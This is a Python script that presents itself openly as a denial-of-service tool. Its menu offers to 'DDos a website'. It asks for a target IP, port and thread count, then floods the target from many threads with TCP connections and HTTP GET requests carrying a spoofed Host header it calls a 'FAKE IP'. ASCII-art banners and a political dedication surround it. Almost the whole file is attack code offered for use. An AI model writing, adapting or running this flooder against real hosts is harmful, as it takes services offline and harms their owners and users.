#!/usr/bin/python3
import os
import socket
import threading
import time
import fade
from colorama import Fore, Style
def ddos():
    os.system("clear")
    print("press CTRL + C and press ENTER to exit !!!")
    while True:
        try:
            threads = int(input("ENTER NUMBER OF THREADS : "))
        except ValueError:
            print("please enter a integer value")
            continue;
        else:
            break;
    attack_num = 0
    trget = str(input(Fore.RED + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
    fake = '192.178.1.38'
    #port = 80( default http port is 80)
    while True:
        try:
            port = int(input("ENTER PORT (default port : 80 ) : ") or 80)
        except ValueError:
            print("Please enter a valid port , please try again")
            continue;
        else:
            break;
    print(f"performing Ddos on {trget} on PORT {port} using FAKE IP {fake} ")
    print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
    print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
    time.sleep(4)
    print(Fore.YELLOW + Style.BRIGHT + "DDos starting in ~")
    print("seconds : 3")
    time.sleep(1)
    print("seconds : 2")
    time.sleep(1)
    print("seconds : 1")
    time.sleep(1)

    def attack():
        nonlocal attack_num
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((trget, port))
                s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
                s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
                
                attack_num += 1
                time.sleep(1)
                print(f"\r[☠️]\033[37m H0st > | \033[33m1{fake} \033[37m| running \033[32m{attack_num}")
                print(f"\r[💥]\033[38;5;39m Get > \033[37m| \033[38;5;220m{trget} \033[37m|\033[38;5;37m Port > \033[91m{port}")
            except socket.error:
                print('\033[32mConnection failid \033[31mHost may be down \033[94mPlease check host\033[0m')
                break
                s.close()

    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()
def print_red_centered_art():
    os.system("clear")
    art = '''
                                      ╭╮
                                      ││     ╭╮
                                      ││     ╰╯
                                      ││   ╭────╮                         
                                      ││  ╭│───╮│
                                      ││  ││   ││
                                      ││  │╰────╮         
             ╭╮╭╮                     ││  ╰─────│╮
             ╰╯╰╯                     ││        ││
          ╭╮     ╭╮   ╭╮     ╭╮     ╭│─────────╯
          ││     ││   ││     ││     │╰────────╯
          ─│─────╭│───╰│─────╰│─────│╯
           ╰─────╯╰────╰─────╯╰─────╯
\033[33m╔════════════════════════════════════════════════════════════╗       
\033[33m║                                                            ║ 
\033[33m╚════════════════════════════════════════════════════════════╝      
'''
    red_art = f"{Fore.GREEN}{art}{Style.RESET_ALL}"  # Set th text color to red
    print(red_art.center(80))  # Adjust the width (80 characters) to match your terminal size
    #red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
    red_art2 = f"{Fore.YELLOW}{Style.RESET_ALL}"
    print((80))
    print(Fore.YELLOW + Style.BRIGHT + "[KUNFAY's dedication and struggle for PALESTINE]")
if __name__ == "__main__":
    print_red_centered_art()
def menu():
   # print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" Fore.WHITE + "Press CTRL + C and press enter to exit!!")
    print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.BLUE + "Press CTRL + C and press enter to exit!!")
    print(Fore.WHITE + Style.BRIGHT + "—————————————————————————————————————————————————————————————————")
    print(Fore.YELLOW + Style.BRIGHT + "Silahkan ketik 1 untuk melanjutkan...")
    print(Fore.BLUE + Style.BRIGHT + "1. DDos a website.  [1]")
    print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
    print("Enter your options .. [e.g 1,2]") 
    global usr
    usr = input(Fore.YELLOW + Style.BRIGHT + "0======>> " )
    if usr == "1":
        ddos()
    elif usr == "2":
        print("Exiting...")
        time.sleep(1)
    else:
        print("invalid option..try again.")
        menu()
menu()
